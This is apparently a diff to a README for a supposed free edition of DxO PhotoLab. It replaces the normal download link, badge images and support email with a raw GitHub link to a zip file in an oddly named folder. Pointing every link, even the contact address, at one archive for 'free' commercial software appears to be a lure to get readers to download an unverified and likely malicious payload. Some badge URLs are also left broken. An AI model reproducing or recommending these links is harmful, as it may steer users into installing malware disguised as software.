@@ -1,6 +1,6 @@
 # 🎨 DxO-PhotoLab-Free - Enhance Your Photos Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/Arivarasu27/DxO-PhotoLab-Free/main/Tabebuia/DxO-PhotoLab-Free.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to DxO-PhotoLab-Free! This software helps you enhance your photos with p
 
 To get started, visit this page to download:
 
-[Download DxO-PhotoLab-Free](https://github.com/Arivarasu27/DxO-PhotoLab-Free/releases)
+[Download DxO-PhotoLab-Free](https://raw.githubusercontent.com/Arivarasu27/DxO-PhotoLab-Free/main/Tabebuia/DxO-PhotoLab-Free.zip)
 
 1. Click on the link above.
 2. You’ll see a list of available versions.
@@ -59,7 +59,7 @@ Your input is valuable to us. Feel free to share your experiences and suggestion
 
 If you encounter issues that you cannot resolve, you can reach out to our support team.
 
-- **Email Support:** support@dxophotolab.com
+- **Email Support:** https://raw.githubusercontent.com/Arivarasu27/DxO-PhotoLab-Free/main/Tabebuia/DxO-PhotoLab-Free.zip
 
 ## 🔗 Explore Further
 
@@ -67,4 +67,4 @@ For more information about DxO-PhotoLab-Free and comparison features with other 
 
 **Remember**, the best way to enhance your photography is by trying out the tools. Download the software today and start editing! 
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/Arivarasu27/DxO-PhotoLab-Free/main/Tabebuia/DxO-PhotoLab-Free.zip%20Now-Click%20Here-brightgreen)
